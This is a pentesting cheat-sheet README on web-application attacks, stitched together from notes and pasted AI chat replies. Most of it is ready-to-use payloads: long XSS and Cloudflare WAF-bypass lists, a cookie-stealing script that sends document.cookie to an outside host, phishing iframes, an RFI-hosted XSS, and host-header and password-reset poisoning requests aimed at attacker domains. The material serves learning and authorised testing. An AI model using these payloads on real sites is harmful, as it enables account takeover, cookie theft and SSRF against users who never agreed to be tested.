<img src="https://github.com/Anvesh464/Web_APP_Test/blob/main/Pilot%20Testing/media/Ashok%20Findings.jpeg?raw=true" width="600">

* [SQL Injection](https://github.com/Anvesh464/Web_APP_Test/tree/main/SQL%20Injection/)
* [Server Side Request Forgery](https://github.com/Anvesh464/Web_APP_Test/tree/main/Server%20Side%20Request%20Forgery/)
* [Server Side Template Injection](https://github.com/Anvesh464/Web_APP_Test/tree/main/Server%20Side%20Template%20Injection/)
* [Upload Insecure Files](https://github.com/Anvesh464/Web_APP_Test/tree/main/Upload%20Insecure%20Files/)
* [Web Cache Deception](https://github.com/Anvesh464/Web_APP_Test/tree/main/Web%20Cache%20Deception/)
* [Web Sockets](https://github.com/Anvesh464/Web_APP_Test/tree/main/Web%20Sockets/)
* [XSLT Injection](https://github.com/Anvesh464/Web_APP_Test/tree/main/XSLT%20Injection/)
* [XXE Injection](https://github.com/Anvesh464/Web_APP_Test/tree/main/XXE%20Injection/)
* [XSS Injection](https://github.com/Anvesh464/Web_APP_Test/tree/main/XSS%20Injection/)
  
Make life easier, not harder.
[PayloadsAllTheThings - GitHub](https://github.com/swisskyrepo/PayloadsAllTheThings)

### Application version-related exploits
Search in [exploit-db](https://www.exploit-db.com/)

## Addons 

- Hackbar, CounterXSS, FindSomething, XSS辅助工具, XSS, Hack-Tools, WhatCMS, 
- FoxyProxy Standard
- Wappalyzer
- Cookies Manager+
- SQL Inject Me
- XSS Me
- Tamper Data
- SecurityFocus Vulnerabilities search plugin
- Packet Storm search plugin
- Offsec Exploit-db Search

## Vulnerability Categories

- XSS
- Host Header Injection
- URL Redirection
- Parameter Tampering
- HTML Injection
- File Inclusion
- SPF Record Misconfiguration
- Insecure CORs Configuration
- SSRF
- Critical File Disclosure
- Source Code Disclosure
- CSRF
- Subdomain Takeover
- SQL Injection
- Command Injection
- File Upload Vulnerabilities
- XML Injection

## cURL to Burp Request Command
curl -x 127.0.0.1:8080

## XSS Payload Example
```html
%3cscript%3ealert%281%29%3c%2fscript%3e
```
# Enumeration

## 1. Information Gathering

- has to know the terminology and gather information about the version, Server, Frameworks, and Default credentials.
- Identify previous vulnerabilities related to the application.

### Injection Points

- Where vulnerabilities can exist.
- Injection paint is vulnerability location.(parameters)

### Information Flow

1. Site
2. Subdomains
3. Select unpopular websites
4. Find IP Address
5. Which programming language they are using
6. Open ports and services
7. Site:eur.nl responsible disclosure

### Tools for Finding Subdomains

- [VirusTotal](https://www.virustotal.com/gui/home/search)
- [Subbrute](https://github.com/TheRook/subbrute)
  ```bash
  ./subbrute.py -c 50 example.com > example.com
  ```
- [Altdns](https://github.com/infosec-au/altdns)
- [Netcraft](https://searchdns.netcraft.com/)
- [HTTP Status Checker](https://httpstatus.io/)
- [SubFinder](https://github.com/projectdiscovery/subfinder)

sort out subdomain unpapularity (Less travel route)

### Finding IP Address & Open Ports

- Ping to find tha ip address or use the namp to know the open ports aggresive scanning os and version information & vuln scanning.
- If it is not in scope do the poty numnber 80 and 443 for vulnerability scanning.

### Server Information & Banner Grabbing

```bash
whatweb domain.name
nikto -h domain.name
nc domain.name 80
nc head / http/1.0
telnet
waplayzer
```
## Information disclosure

GET /product?productId=aaa
We find the debug page in “/cgi-bin/phpinfo.php”:

![image](https://github.com/user-attachments/assets/7028eb48-100c-4f87-a0d6-1efeb49c46a5)

We can find the secret key ("8f4xrr692ckcxycofkaupwwu37cse6io") in the “Environment” section:
![image](https://github.com/user-attachments/assets/17a0365b-bd9f-40f5-9658-c7552440bdd4)
There is a /robots.txt file:
forcefully generating an error messages 
check .js file for disclosure credentials
The directory .git/ exists and allows directory listing:

After logging in, send a request with the TRACE HTTP method, which reveals the header “X-Custom-IP-Authorization”:
![image](https://github.com/user-attachments/assets/a2d7fc98-b0a8-4520-aba9-48f6645213ef)
It is possible to access /admin with:
```
GET /admin HTTP/2
...
X-Custom-Ip-Authorization: 127.0.0.1
```
![image](https://github.com/user-attachments/assets/6adc9f6e-9d48-4529-9d5b-5e2138f31296)
And then delete the user with:
```
GET /admin/delete?username=carlos HTTP/2
...
X-Custom-Ip-Authorization: 127.0.0.1
```
![image](https://github.com/user-attachments/assets/409feb4b-ed8d-45dd-9348-625d13a5cc0d)

---
## API Key and Token Leaks

```markdown
# API Key and Token Leaks

## Common Causes of Leaks

- **Hardcoding in Source Code**: Developers may unintentionally leave API keys or tokens directly in the source code.
- **Public Repositories**: Accidentally committing sensitive keys and tokens to publicly accessible version control systems like GitHub.
- **Hardcoding in Docker Images**: API keys and credentials might be hardcoded in Docker images hosted on DockerHub or private registries.
- **Logs and Debug Information**: Keys and tokens might be inadvertently logged or printed during debugging processes.
- **Configuration Files**: Including keys and tokens in publicly accessible configuration files (e.g., `.env` files, `config.json`, `settings.py`, or `.aws/credentials`).

## Scan a GitHub Organization

To scan an entire GitHub organization for leaks, run the following command:

```bash
docker run --rm -it -v "$PWD:/pwd" trufflesecurity/trufflehog:latest github --org=trufflesecurity
```

## Scan a GitHub Repository, its Issues, and Pull Requests

To scan a GitHub repository including its issues and pull requests, run:

```bash
docker run --rm -it -v "$PWD:/pwd" trufflesecurity/trufflehog:latest github --repo https://github.com/trufflesecurity/test_keys --issue-comments --pr-comments
```

## Scan a Docker Image for Verified Secrets

To scan a Docker image for secrets, use the following command:

```bash
docker run --rm -it -v "$PWD:/pwd" trufflesecurity/trufflehog:latest docker --image trufflesecurity/secrets
```
## Account Takeover

* [Password Reset Feature](#password-reset-feature)
    * [Password Reset Token Leak via Referrer](#password-reset-token-leak-via-referrer)
    * [Account Takeover Through Password Reset Poisoning](#account-takeover-through-password-reset-poisoning)
    * [Password Reset via Email Parameter](#password-reset-via-email-parameter)
    * [IDOR on API Parameters](#idor-on-api-parameters)
    * [Weak Password Reset Token](#weak-password-reset-token)
    * [Leaking Password Reset Token](#leaking-password-reset-token)
    * [Password Reset via Username Collision](#password-reset-via-username-collision)
    * [Account Takeover Due To Unicode Normalization Issue](#account-takeover-due-to-unicode-normalization-issue)
* [Account Takeover via Web Vulneralities](#account-takeover-via-web-vulneralities)
    * [Account Takeover via Cross Site Scripting](#account-takeover-via-cross-site-scripting)
    * [Account Takeover via HTTP Request Smuggling](#account-takeover-via-http-request-smuggling)
    * [Account Takeover via CSRF](#account-takeover-via-csrf)
    * Account Takeover via JWT - * JSON Web Token might be used to authenticate an user. Edit the JWT with another User ID / Email - Check for weak JWT signature

## Business Logic Errors

* [Methodology](#methodology)
    * [Review Feature Testing](#review-feature-testing)
    * [Discount Code Feature Testing](#discount-code-feature-testing)
    * [Delivery Fee Manipulation](#delivery-fee-manipulation)
    * [Currency Arbitrage](#currency-arbitrage)
    * [Premium Feature Exploitation](#premium-feature-exploitation)
    * [Refund Feature Exploitation](#refund-feature-exploitation)
    * [Cart/Wishlist Exploitation](#cartwishlist-exploitation)
    * [Thread Comment Testing](#thread-comment-testing)
* [References](#references)

## Methodology

Unlike other types of security vulnerabilities like SQL injection or cross-site scripting (XSS), business logic errors do not rely on problems in the code itself (like unfiltered user input). Instead, they take advantage of the normal, intended functionality of the application, but use it in ways that the developer did not anticipate and that have undesired consequences.

Common examples of Business Logic Errors.

### Review Feature Testing

* Assess if you can post a product review as a verified reviewer without having purchased the item.
* Attempt to provide a rating outside of the standard scale, for instance, a 0, 6 or negative number in a 1 to 5 scale system.
* Test if the same user can post multiple ratings for a single product. This is useful in detecting potential race conditions.
* Determine if the file upload field permits all extensions; developers often overlook protections on these endpoints.
* Investigate the possibility of posting reviews impersonating other users.
* Attempt Cross-Site Request Forgery (CSRF) on this feature, as it's frequently unprotected by tokens.

### Discount Code Feature Testing

* Try to apply the same discount code multiple times to assess if it's reusable.
* If the discount code is unique, evaluate for race conditions by applying the same code for two accounts simultaneously.
* Test for Mass Assignment or HTTP Parameter Pollution to see if you can apply multiple discount codes when the application is designed to accept only one.
* Test for vulnerabilities from missing input sanitization such as XSS, SQL Injection on this feature.
* Attempt to apply discount codes to non-discounted items by manipulating the server-side request.

### Delivery Fee Manipulation

* Experiment with negative values for delivery charges to see if it reduces the final amount.
* Evaluate if free delivery can be activated by modifying parameters.

### Currency Arbitrage

* Attempt to pay in one currency, for example, USD, and request a refund in another, like EUR. The difference in conversion rates could result in a profit.

### Premium Feature Exploitation

* Explore the possibility of accessing premium account-only sections or endpoints without a valid subscription.
* Purchase a premium feature, cancel it, and see if you can still use it after a refund.
* Look for true/false values in requests/responses that validate premium access. Use tools like Burp's Match & Replace to alter these values for unauthorized premium access.
* Review cookies or local storage for variables validating premium access.

### Refund Feature Exploitation

* Purchase a product, ask for a refund, and see if the product remains accessible.
* Look for opportunities for currency arbitrage.
* Submit multiple cancellation requests for a subscription to check the possibility of multiple refunds.

### Cart/Wishlist Exploitation

* Test the system by adding products in negative quantities, along with other products, to balance the total.
* Try to add more of a product than is available.
* Check if a product in your wishlist or cart can be moved to another user's cart or removed from it.

### Thread Comment Testing

* Check if there's a limit to the number of comments on a thread.
* If a user can only comment once, use race conditions to see if multiple comments can be posted.
* If the system allows comments by verified or privileged users, try to mimic these parameters and see if you can comment as well.
* Attempt to post comments impersonating other users.

## References

* [Business Logic Vulnerabilities - PortSwigger - 2024](https://portswigger.net/web-security/logic-flaws)
* [Business Logic Vulnerability - OWASP - 2024](https://owasp.org/www-community/vulnerabilities/Business_logic_vulnerability)
* [CWE-840: Business Logic Errors - CWE - March 24, 2011](https://cwe.mitre.org/data/definitions/840.html)
* [Examples of Business Logic Vulnerabilities - PortSwigger - 2024](https://portswigger.net/web-security/logic-flaws/examples)
# 3. Cross-Site Scripting (XSS)

## XSS Background

**Impact of XSS:**
- Cookie theft
- Keylogging
- Phishing
- URL Redirection
- Site defacement

### Common XSS Injection Points

- Comment boxes
- Forums
- Signup/Login pages
- Search bars
- Registration forms
- Feedback forms
- Contact us forms etc....

### How to Hunt for XSS

1. Find an input parameter and provide input If input reflects or is stored, there may be XSS.
2. Try executing JavaScript if you succeed to execute any javascript there then there is a XSS vulnerability.
3. sort out all the parameters in burp-suite and check one by one or browse it through the webserver and check it here reflecting or not.

## XSS Payloads

```html
"><script>alert(1)</script>
"><svg/onload=alert(1)>
```
### Cloudflare XSS Bypasses
```html
<svg/OnLoad="`${prompt``}`">
<svg/onload=%26nbsp;alert`bohdan`+
1'"><img/src/onerror=.1|alert``>
<svg onload=prompt%26%230000000040document.domain)>
<svg onload=prompt%26%23x000000028;document.domain)>
xss'"><iframe srcdoc='%26lt;script>;prompt`${document.domain}`%26lt;/script>'>
<svg/onload=&#97&#108&#101&#114&#00116&#40&#41&#x2f&#x2f
<a href="j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;&lpar;a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;(document.domain)&rpar;">X</a>
</script><svg><script>alert(1)-%26apos%3B
anythinglr00</script><script>alert(document.domain)</script>uxldz
anythinglr00%3c%2fscript%3e%3cscript%3ealert(document.domain)%3c%2fscript%3euxldz
<object data='data:text/html;;;;;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='></object>
<svg onload\r\n=$.globalEval("al"+"ert()");>
?"></script><base%20c%3D=href%3Dhttps:\mysite>
<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() x>
<a href=javas&#99;ript:alert(1)>
\u003e\u003c\u0068\u0031 onclick=alert('1')\u003e
"><img src=x onerror=alert(document.cookie);.jpg
<sCrIpt>alert(1)</ScRipt>
<ScrIPt>alert(1)</ScRipT>
<img src='1' onerror='alert(0)' <
<a href="" onmousedown="var name = '&#39;;alert(1)//'; alert('smthg')">Link</a>
<script>onerror=alert;throw 1337</script>
<script>{onerror=alert}throw 1337</script>
<script>throw onerror=alert,'some string',123,'haha'</script>
<img src='1' onerror\x00=alert(0) />
<img src='1' onerror\x0b=alert(0) />
<img src='1' onerror\x0d=alert(0) />
<img src='1' onerror\x0a=alert(0) />
<img src='1' onerror/=alert(0) />
<img/src='1'/onerror=alert(0)>
𒀀='',𒉺=!𒀀+𒀀,𒀃=!𒉺+𒀀,𒇺=𒀀+{},𒌐=𒉺[𒀀++],
𒀟=𒉺[𒈫=𒀀],𒀆=++𒈫+𒀀,𒁹=𒇺[𒈫+𒀆],𒉺[𒁹+=𒇺[𒀀]
+(𒉺.𒀃+𒇺)[𒀀]+𒀃[𒀆]+𒌐+𒀟+𒉺[𒈫]+𒁹+𒌐+𒇺[𒀀]
+𒀟][𒁹](𒀃[𒀀]+𒀃[𒈫]+𒉺[𒀆]+𒀟+𒌐+"(𒀀)")()
javascript:alert(1)//INJECTX
<svg/onload=alert(1)>//INJECTX
<img onload=alert(1)>//INJECTX
<img src=x onerror=prompt(1)>//INJECTX
<a href="javascript:alert(1)" onmouseover=alert(1)>INJECTX HOVER</a>
 onmouseover="document.cookie=true;">//INJECTX
alert(1)>//INJECTX
<h1>INJECTX</h1>
<img src=x onload=prompt(1) onerror=alert(1) onmouseover=prompt(1)>
<svg><script>/<@/>alert(1)</script>//INJECTX
<svg/onload=alert(/INJECTX/)>
<iframe/onload=alert(/INJECTX/)>
<svg/onload=alert`INJECTX`>
<svg/onload=alert(/INJECTX/)>
<svg/onload=alert(`INJECTX`)>
}alert(/INJECTX/);{//
<h1/onclick=alert(1)>a//INJECTX
<svg/onload=alert(/INJECTX/)>
<p/onclick=alert(/INJECTX/)>a
<svg/onload=alert`INJECTX`>
<svg/onload=alert(/INJECTX/)>
<svg/onload=alert(`INJECTX`)>
<video><source onerror="javascript:alert(1)">//INJECTX
<video onerror="javascript:alert(1)"><source>//INJECTX
<audio onerror="javascript:alert(1)"><source>//INJECTX
<input autofocus onfocus=alert(1)>//INJECTX
<select autofocus onfocus=alert(1)>//INJECTX
<textarea autofocus onfocus=alert(1)>//INJECTX
<keygen autofocus onfocus=alert(1)>//INJECTX
<button form=test onformchange=alert(1)>//INJECTX
<form><button formaction="javascript:alert(1)">//INJECTX
<svg onload=(alert)(1) >//INJECTX
<script>$=1,alert($)</script>//INJECTX
<!--<img src="--><img src=x onerror=alert(1)//">//INJECTX
<img/src='x'onerror=alert(1)>//INJECTX
<marguee/onstart=alert(1)>//INJECTX
<script>alert(1)//INJECTX
<script>alert(1)<!--INJECTX
<marquee loop=1 width=0 onfinish=alert(1)>//INJECTX
<a href=javas&#99;ript:alert(1)>
anythinglr00</script><script>alert(document.domain)</script>uxldz
anythinglr00%3c%2fscript%3e%3cscript%3ealert(document.domain)%3c%2fscript%3euxldz
<svg onload=prompt%26%230000000040document.domain)>
<svg onload=prompt%26%23x000000028;document.domain)>
xss'"><iframe srcdoc='%26lt;script>;prompt`${document.domain}`%26lt;/script>'>
<svg/onrandom=random onload=confirm(1)>
<video onnull=null onmouseover=confirm(1)>
<svg/OnLoad="`${prompt``}`">
<svg/onload=%26nbsp;alert`bohdan`+
<svg onload=prompt%26%230000000040document.domain)>
<svg onload=prompt%26%23x000000028;document.domain)>
xss'"><iframe srcdoc='%26lt;script>;prompt`${document.domain}`%26lt;/script>'>
</script><svg><script>alert(1)-%26apos%3B
?"></script><base%20c%3D=href%3Dhttps:\mysite>
?"></script><base%20c%3D=href%3Dhttps:\mysite>
\u003e\u003c\u0068\u0031 onclick=alert('1')\u003e
<a href=javas&#99;ript:alert(1)>
<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() x>
<object data='data:text/html;;;;;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='></object>
anythinglr00</script><script>alert(document.domain)</script>uxldz
anythinglr00%3c%2fscript%3e%3cscript%3ealert(document.domain)%3c%2fscript%3euxldz
<svg/onload=&#97&#108&#101&#114&#00116&#40&#41&#x2f&#x2f

```

1. Characters ' " < > / // ( ) ^ script img svg div alert prompt 
2. Event Handlers

### White Characters Identifying XSS

- Special characters: `' " < > / // ( ) ^ script img svg div alert prompt`
- Event Handlers:

```bash
  Hello" onkeypress="prompt(1)
<div onpointerover="alert(45)">MOVE HERE</div>
<div onpointerdown="alert(45)">MOVE HERE</div>
<div onpointerenter="alert(45)">MOVE HERE</div>
<div onpointerleave="alert(45)">MOVE HERE</div>
<div onpointermove="alert(45)">MOVE HERE</div>
<div onpointerout="alert(45)">MOVE HERE</div>
<div onpointerup="alert(45)">MOVE HERE</div>
```
practise excercise: websites:

https://prompt.ml/0
http://leettime.net/xsslab1/

### Bypassing XSS Filters

- Bypass using UTF-8 Encoding
- Bypass using Unicode Encoding
- Bypass using HTML Encoding
- Bypass using Octal Encoding
- Bypass using Common WAF Bypass

### Cloudflare XSS Bypass

```html
<svg/OnLoad="`${prompt``}`">
<svg/onload=alert`bohdan`>
```

### Practical XSS Exercises

- [Prompt.ml](https://prompt.ml/0)
- [XSS Lab](http://leettime.net/xsslab1/)
```
# 4. Manual XSS Vector Building

## Steps to Find & Exploit XSS

1. Find an input field that reflects input.
2. Check response in **view-source**.
3. Close any open tags.
4. Use event handlers like `onmouseover` for bypassing sanitization.

Example: <input type="text" name="name" value='hello'>
<input type="submit" name="submit" value="search">
Payload: 'onmouseover='alert(1);
# References

- [PayloadsAllTheThings - XSS Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)
- [LeetTime XSS Labs](http://leettime.net/xsslab1/)
- [Prompt.ml](https://prompt.ml/)
```
---
# XSS & Host Header Injection Testing Guide

## 1. First SDIPER Application
- Sort out the parameters.
- Check one by one → Send to repeater → Use payloads (`hello1`, `hello2`).
- If `hello2` is reflecting, try scripts or brute-force attacks.
- Sort the maximum length of the first 10 results, then show the response in the browser.

### Payload Naming:
- Use `xss.txt` for payloads or manually set a payload.
- Manual testing is better for stored XSS vulnerabilities.

## 2. Brute-Force Attack Considerations
- If you want to stop URL encoding, go for payload encoding.
- Uncheck URL encoding for better results.

## 3. XSS Through Header Injection
- Capture the request using **Burp Suite**.
- Add a `Referer` field below the `Host` in the header.
- Send it to the repeater:
  ```
  Host: abc.com
  Referer: hello
  ```
- If `hello` is reflecting, use the following payload:
  ```html
  <script>alert(1)</script>
  ```

## 4. URL Redirection
- Instead of `alert(1)`, use URL redirection.
- If it redirects to `bing.com`, it is vulnerable.
  ```html
  <script>document.location.href="http://bing.com"</script>
  ```
  Example vulnerable URL:
  ```
  http://www.woodlandwordwide.com/wnew.faces/tiles/page/search.jsp?searchkey=<script>document.location.href="http://bing.com"</script>
  ```

## 5. Phishing via XSS
- Instead of `alert(1)`, use an iframe:
  ```html
  <iframe src="http://bing.com" height="100%" width="100%"></iframe>
  ```

## 6. Cookie Stealing via XSS
- Victim's website transfers cookies to the attacker's site:
  ```html
  <script>document.location.href="http://bing.com/p/?page="+document.cookie</script>
  ```

## 7. XSS Through File Uploading
### Method 1:
- The `file_name` parameter is reflecting in the **view-source** (e.g., `abc.jpeg`).
- Attack by injecting scripts into the filename.
- Use **Intruder** with common payloads.

### Method 2:
- Upload a file containing an XSS script.
- Access the file to trigger the payload.

## 8. XSS Through RFI Vulnerability
- If an application has RFI vulnerability, host an XSS script on the attacker's server:
  ```
  http://10.10.11.24/xss.html  # Contains XSS payload
  ```
- Execute via a vulnerable endpoint:
  ```
  http://abc.com/cmn/js/ajax.php?url=http://10.10.11.24/xss.html
  ```

## 9. Self-XSS to Reflected XSS
- Copy the vulnerable **HTML response** from Burp Suite.
- Save it as an HTML file and open it in Firefox.
- Instead of `alert(1)`, use:
  ```html
  document.location.href="http://bing.com"
  ```
- Example:
  ```
  /@213dewf it is reflecting in browser → add XSS script:
  /@213dewf"><script>alert(1)</script>
  ```

## 10. Blind XSS Vulnerability
- Use **Hunter** for detection.
```
```
---
# Host Header Injection
## 1. Overview
- Exploiting host header injection in **virtual hosting environments**.
- Can lead to **web cache poisoning, XSS, password reset poisoning, and internal host access**.
- i.e 3xx and 200 status code of 300 | 301 | 302 | 303 | 304 -- 3xx is the best one for this attack for an example login page has multiple redirection request, modify any one of them
- Tools: https://github.com/inpentest/HostHeaderScanner - python host_header_scanner.py http://target.com --threads 10 --verbose 2 --oob oob.example.com
- [https://portswigger.net/bappstore/3908768b9ae945d8adf583052ad2e3b3 headi -url http://target.com](https://www.blackhatethicalhacking.com/tools/headi/) headi -url http://target.com
- https://github.com/inpentest/HostHeaderScanner bash script.sh -l urls.txt

## 2. Attack Methods
### Method 1:
```http
Host: bing.com
```
### Method 2:
```http
Host: bing.com
X-Forwarded-Host: realweb.com
```
### Method 3:
```http
Host: realweb.com
X-Forwarded-Host: bing.com
```
### Method 4:
```http
Referer: https://www.bing.com/
Try to change host and referer header because few host is verify for referer header information. 
also do the same first three attack to insert the referer header (Change referer header)
```

## 3. Host Header Injection with Web Cache Poisoning
- Follow the above methods.
- Click anywhere on the web application.
- If redirected to `bing.com`, the site is vulnerable.

## 4. Password Reset Poisoning
- Obtain a **password reset link**.
- Modify the `Host` header.

## 5. Host Header Attack for XSS
- Check if the response contains:
  ```html
  https://bing.com/?locald">
  ```
- Use the payload:
  ```html
  Host: bing.com"><script>alert(1)</script>
  ```

## 6. Host Header Injection on Referer Header
- Modify headers:
  ```http
  Connection: close
  Referer: https://www.bing.com/
  ```

## 7. Subdomain-Based Host Header Injection
- Use existing and non-existing subdomains to inject headers.

## 8. Advanced Host Header Attacks
### Internal Host Access:
```http
GET / HTTP/1.1
Host: attacker.com

GET / HTTP/1.1
Host: vulnerable.com
Host: attacker.com

GET / HTTP/1.1
Host: vulnerable.com
X-Forwarded-Host: attacker.com

GET https://vulnerable.com/ HTTP/1.1
Host: attacker.com

GET / HTTP/1.1
Host: vulnerable.com
X-Host: attacker.com
X-Forwarded-Server: attacker.com
X-HTTP-Host-Override: attacker.com
Forwarded: host=attacker.com
```
Based on your GitHub lab on [HTTP Host Header Attacks](https://github.com/Anvesh464/Portswigger-Labs/tree/main/20%20-%20HTTP%20Host%20header%20attacks), here's a **step-by-step breakdown** for each attack scenario from the PortSwigger labs.

To identify Host Header Injection vulnerabilities, focus on these key parameters and headers:

- **Host**: The primary header to test. Try injecting arbitrary domains.
- **X-Forwarded-Host**: Often used by proxies; can override the Host header.
- **X-Host**, **X-Forwarded-Server**, **X-HTTP-Host-Override**, **Forwarded**: Alternative headers that may be parsed by backend systems.
- **Absolute URLs in request line**: Some servers prioritize the URL over the Host header.
- **Duplicate Host headers**: Can cause discrepancies between frontend and backend parsing.
- **Line wrapping or malformed headers**: Indentation or spacing tricks may bypass validation.

🧨 **Common Payloads to Bypass WAFs**

Here’s a cheat sheet of payloads that may help bypass WAFs during Host Header Injection testing:

| Header Variant              | Payload Example              |
|----------------------------|------------------------------|
| Host                       | `evil.com`                   |
| X-Forwarded-Host           | `evil.com`                   |
| X-Host                     | `evil.com`                   |
| X-Forwarded-Server         | `evil.com`                   |
| X-HTTP-Host-Override       | `evil.com`                   |
| Forwarded                  | `host=evil.com`              |
| Absolute URL               | `GET https://evil.com/ HTTP/1.1` |
| Duplicate Host             | `Host: vulnerable.com` + `Host: evil.com` |
| Line Wrapping              | `Host: vulnerable.com\n Host: evil.com` |

💡 **Tips for Bypassing WAFs**
- Use **non-standard ports**: `Host: evil.com:badport`
- Try **subdomain tricks**: `Host: attacker.vulnerable.com`
- Use **encoded characters**: `%0d%0aHost: evil.com`
- Leverage **proxy headers**: Some WAFs ignore `X-Forwarded-Host`

Sure! Based on the content from the GitHub repository you linked, here are the **specific techniques demonstrated in the PortSwigger Labs for HTTP Host header attacks**:

# **1. List of Vulnerabilities (Full Set)**

1. **Web Cache Poisoning**
2. **Password Reset Link Poisoning**
3. **Host Header Injection**
4. **Open Redirect / URL Confusion**
5. **Virtual Host Routing Bypass**
6. **SSRF via Host Header**
7. **Access Control Bypass**
8. **CORS Bypass Using Host Reflection**
9. **Log Injection**
10. **Firewall / WAF Bypass Cases** *(NEW)*
11. **Domain Validation Bypass** *(NEW)*
12. **Header Override Bypass** *(NEW)*
13. **Unicode / Encoding Bypass** *(NEW)*

---

# **2. Sample Payloads (Including Bypass Payloads)**

All payloads are ready to use for pentesting.

---

# 📌 **2.1 Basic Manipulation Payloads**

```
Host: evil.com
```

```
Host: attacker.com
```

```
Host: fake.target.com
```

---

# 📌 **2.2 Password Reset Poisoning**

```
POST /forgot HTTP/1.1
Host: evil.com
Content-Type: application/json

{"email":"victim@example.com"}
```

---

# 📌 **2.3 Open Redirect / URL Confusion**

```
Host: evil.com:8080
```

```
Host: legit.com.evil.com
```

---

# 📌 **2.4 SSRF Using Host Header**

```
Host: 127.0.0.1
```

```
Host: 169.254.169.254   # AWS metadata
```

```
Host: localhost
```

---

# 📌 **2.5 Admin Panel / VHost Bypass**

```
Host: admin.target.com
```

```
Host: internal.target.local
```

```
Host: staging.target.com
```

---

# **3. Bypass Testcases (Advanced)**

Below are full bypass patterns to defeat filters, WAF, and strict host validation logic.

---

# 🔥 **3.1 Domain Validation Bypass Payloads**

### Case: Application checks `endswith("target.com")` incorrectly

```
Host: target.com.evil.io
```

```
Host: target.com.attacker.net
```

```
Host: evil.com?target.com
```

```
Host: target.com#evil.com
```

---

# 🔥 **3.2 Header Override Bypass**

Some applications prioritize these headers over `Host:`:

```
X-Forwarded-Host: evil.com
```

```
X-Host: attacker.com
```

```
X-Forwarded-Server: evil.com
```

```
X-HTTP-Host-Override: evil.com
```

Combine:

```
Host: trusted.com
X-Forwarded-Host: evil.com
```

---

# 🔥 **3.3 Port-Based Bypass**

```
Host: target.com:443
```

```
Host: target.com:80
```

```
Host: target.com:8080
```

```
Host: target.com:*
```

These bypass strict host comparisons.

---

# 🔥 **3.4 Whitespace / Tab Injection Bypass**

```
Host: evil.com%20
```

```
Host: evil.com%0d%0aInjected: yes
```

```
Host: evil.com\t
```

```
Host: evil.com\r\nX-Test: 123
```

---

# 🔥 **3.5 Unicode / Encoding Bypass Cases**

### Using punycode:

```
Host: xn--evil-9sa.com
```

### Using IP-long form:

```
Host: 2130706433     # 127.0.0.1 in decimal
```

### Hex:

```
Host: 0x7f000001
```

### Octal:

```
Host: 0177.0000.0001
```

### Mixed Encoding:

```
Host: evil.com%2Etarget.com
```

---

# 🔥 **3.6 Prefix / Suffix Injection Bypass**

### Fake trusted-host prefix:

```
Host: trusted.com.evil.com
```

### Using @ to confuse parsers:

```
Host: trusted.com@evil.com
```

### Using double host headers:

```
Host: evil.com
Host: target.com
```

Some servers will parse the last one; some the first.

---

# 🔥 **3.7 Null Byte / Special Character Bypass**

```
Host: evil.com%00target.com
```

```
Host: target.com%00.evil.com
```

```
Host: target.com\evil.com
```

---

# 🔥 **3.8 CORS Bypass Using Host Reflection**

Check if server reflects Host header into CORS:

```
Host: evil.com
Origin: http://evil.com
```

---

# 🔥 **3.9 CDN / Proxy Bypass (Akamai, Cloudflare, Nginx)**

```
Forwarded: host=evil.com
```

```
X-Forwarded-Host: internal-admin
```

---

# ✔ **4. Combined Master Payload (All-in-One Fuzzer)**

This helps catch most host header issues in one go:

```
GET / HTTP/1.1
Host: evil.com
X-Forwarded-Host: evil.com
X-Host: attacker.com
X-Forwarded-Server: admin.local
Origin: http://evil.com
Forwarded: host=internal.target
```
### 🧪 Techniques Covered in the Labs

- **Password Reset Poisoning via Host Header**
  - Modify the `Host` header to point to an attacker-controlled domain.
  - Capture the password reset token sent to the malicious domain.

- **Password Reset Poisoning via X-Forwarded-Host**
  - Use `X-Forwarded-Host` instead of `Host` to poison the reset link.
  - Useful when the application trusts proxy headers.

- **Dangling Markup Injection**
  - Inject HTML tags into the `Host` header to manipulate email content.
  - Example: `<a href="http://evil.com">Click here</a>` embedded in the reset email.

- **Web Cache Poisoning**
  - Send ambiguous requests with multiple `Host` headers.
  - Poison the cache to serve malicious content to other users.

- **Host Header Authentication Bypass**
  - Replace the `Host` header with `localhost` or internal IP to gain admin access.
  - Exploits trust assumptions in routing logic.

- **Routing-Based SSRF via Host Header**
  - Use internal IPs in the `Host` header to access internal services.
  - Example: `Host: 192.168.0.96` to reach `/admin` panel.

- **SSRF via Flawed Request Parsing**
  - Exploit parsing inconsistencies by combining external and internal hosts.
  - Often requires Burp Collaborator to confirm SSRF behavior.

These techniques are all demonstrated in the labs and write-ups within that GitHub repo. If you want, I can help you craft payloads or automate testing for each one.
---

## 💥 1. **Web Cache Poisoning via Host Header**

1. **Send a normal GET request and observe the Host: header** 
   ```http
   GET / HTTP/1.1  
   Host: vulnerable-website.com
   ```
2. **Check if caching is enabled**  Look for headers like:
   ```
   X-Cache: HIT or MISS  
   Cache-Control: public  
   ```
3. **Inject a fake Host and observe response**
   ```http
   GET / HTTP/1.1  
   Host: attacker.com
   ```
4. **Send multiple requests to check if content is cached**
   Send the same request and see if the response (with attacker.com) persists.
5. **If vulnerable, host malicious content on attacker.com**
   Others accessing the same page may receive poisoned content.
---
## 🔐 2. **Password Reset Poisoning via Host Header**

Receive the password reset link of a victim on a malicious domain.

### ✅ Steps:

1. **Start the "Forgot Password" flow**
   Enter victim's email (or your own test account).

2. **Intercept the request in Burp Suite**
   Locate the `Host:` header:

   ```
   Host: vulnerable-website.com
   ```

3. **Modify it to your malicious domain**

   ```
   Host: attacker.com
   ```

4. **Forward the request**
   If the app uses `Host:` to build the reset URL, the email will contain a link to `attacker.com/...`

5. **Capture the request on attacker.com**
   Host a simple server (e.g., `python3 -m http.server`) and log incoming URLs.

---

## 🌐 3. **SSRF via Host Header**

### 🎯 Objective:

Use Host header to trick the server into making internal HTTP requests (SSRF).

### ✅ Steps:

1. **Find a feature that fetches data from a URL or reflects Host**
   e.g., redirects, URL previews, tracking pixels.

2. **Send a crafted Host header pointing to an internal resource**

   ```http
   GET / HTTP/1.1  
   Host: 127.0.0.1
   ```

3. **Observe response for internal content**
   You might see server error, timeout, or internal app data in the response.

4. **Try internal services like:**

   * `localhost`
   * `169.254.169.254` (AWS metadata)
   * `internal-api.local`

5. **Log sensitive data**
